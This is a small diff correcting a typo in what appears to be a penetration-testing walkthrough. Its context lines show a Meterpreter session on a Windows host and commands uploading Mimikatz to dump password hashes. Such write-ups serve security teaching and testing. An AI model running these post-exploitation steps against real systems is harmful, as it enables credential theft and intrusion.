@@ -210,7 +210,7 @@ Domain          : WORKGROUP
 Logged On Users : 1
 Meterpreter     : x86/windows
 ```
-We will use Mimikatz as a means to demonstrate an alternate method to dump the hashes required for state two. 
+We will use Mimikatz as a means to demonstrate an alternate method to dump the hashes required for stage two. 
 ```
 meterpreter > cd /
 meterpreter > upload /Users/darksoft/Downloads/mimikatz_trunk/x64 .
